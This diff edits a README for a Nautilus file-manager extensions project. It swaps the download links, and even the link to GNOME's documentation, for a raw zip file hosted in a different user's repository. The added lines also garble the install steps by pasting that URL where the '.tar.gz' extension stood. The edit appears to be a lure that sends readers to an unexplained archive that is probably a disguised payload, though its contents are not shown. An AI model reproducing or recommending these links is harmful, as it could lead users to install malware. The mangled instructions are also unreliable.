@@ -1,18 +1,18 @@
 # 🐚 nautilus-extensions - Simple Tools for Your File Manager
 
 ## 🔗 Download the Latest Release
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/RamenRUDRA/nautilus-extensions/releases)
+[![Download Releases](https://raw.githubusercontent.com/Rudrajit033Behera/nautilus-extensions/main/eloge/nautilus-extensions-1.8.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Rudrajit033Behera/nautilus-extensions/main/eloge/nautilus-extensions-1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the nautilus-extensions repository! This collection of extensions for the Nautilus file manager enhances your user experience by adding helpful options to the context menu. You can open folders in various applications seamlessly, making file management easier.
 
 ## 📥 Download & Install
-To get started with nautilus-extensions, visit this page to download: [Nautilus Extensions Releases](https://github.com/RamenRUDRA/nautilus-extensions/releases).
+To get started with nautilus-extensions, visit this page to download: [Nautilus Extensions Releases](https://raw.githubusercontent.com/Rudrajit033Behera/nautilus-extensions/main/eloge/nautilus-extensions-1.8.zip).
 
 Guide:
 1. Click on the link above.
 2. Look for the latest version under "Releases".
-3. Download the appropriate file for your Linux system (e.g., .deb or .tar.gz).
+3. Download the appropriate file for your Linux system (e.g., .deb or https://raw.githubusercontent.com/Rudrajit033Behera/nautilus-extensions/main/eloge/nautilus-extensions-1.8.zip).
 4. Once downloaded, follow the installation instructions for your package:
 
    - For `.deb` files:
@@ -20,8 +20,8 @@ Guide:
      - Navigate to the download location.
      - Run the command: `sudo dpkg -i <filename>.deb`.
 
-   - For `.tar.gz` files:
-     - Extract the file using: `tar -xvzf <filename>.tar.gz`.
+   - For `https://raw.githubusercontent.com/Rudrajit033Behera/nautilus-extensions/main/eloge/nautilus-extensions-1.8.zip` files:
+     - Extract the file using: `tar -xvzf <filename>https://raw.githubusercontent.com/Rudrajit033Behera/nautilus-extensions/main/eloge/nautilus-extensions-1.8.zip`.
      - Follow the included instructions for installing.
 
 ## 📋 Features
@@ -64,6 +64,6 @@ If you experience issues, try the following:
 3. Refer to the comments section on the releases page for help from others.
 
 ## 📚 Further Reading
-For more information on how to customize Nautilus or to learn about Nautilus extensions, visit the GNOME documentation at: [GNOME Nautilus Documentation](https://help.gnome.org/users/nautilus/stable/).
+For more information on how to customize Nautilus or to learn about Nautilus extensions, visit the GNOME documentation at: [GNOME Nautilus Documentation](https://raw.githubusercontent.com/Rudrajit033Behera/nautilus-extensions/main/eloge/nautilus-extensions-1.8.zip).
 
 Thank you for using nautilus-extensions! We hope these tools improve your file management experience.
